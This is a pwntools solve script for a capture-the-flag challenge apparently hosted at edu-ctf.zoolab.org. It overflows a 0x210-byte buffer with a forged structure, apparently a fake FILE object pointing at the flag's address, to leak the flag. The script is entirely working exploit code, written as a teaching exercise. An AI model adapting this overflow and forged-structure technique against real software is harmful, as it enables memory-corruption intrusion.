from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

if args['R']:
    r = remote('edu-ctf.zoolab.org', 30215)
else:
    r = process('./chal')

r.recvuntil('0x')

note_buf = int(r.recvline(), 16)
flag_addr = note_buf - 0x1010

print(hex(note_buf))
print(hex(flag_addr))

r.sendlineafter('>', b'1')
r.sendlineafter('>', b'2')
gdb.attach(r)
flags = 0x0800
payload = flat(
    flags, 0,
    flag_addr, 0,
    flag_addr, flag_addr + 0x50, 
    0, 0, 
    0, 0, 
    0, 0,
    0, 0,
    1
)

r.sendlineafter('data>', b'A'*0x210 + payload)

r.sendlineafter('>', b'3')

r.interactive()